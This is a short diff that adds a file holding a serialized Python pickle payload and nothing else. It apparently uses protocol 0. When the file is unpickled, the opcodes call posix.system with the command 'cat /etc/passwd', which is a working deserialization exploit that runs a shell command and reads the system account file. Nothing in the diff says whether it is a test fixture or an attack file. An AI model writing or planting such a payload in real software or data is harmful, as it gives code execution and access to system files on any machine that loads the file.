@@ -1,0 +1,7 @@
+cposix
+system
+p0
+(S'cat /etc/passwd'
+p1
+tp2
+Rp3
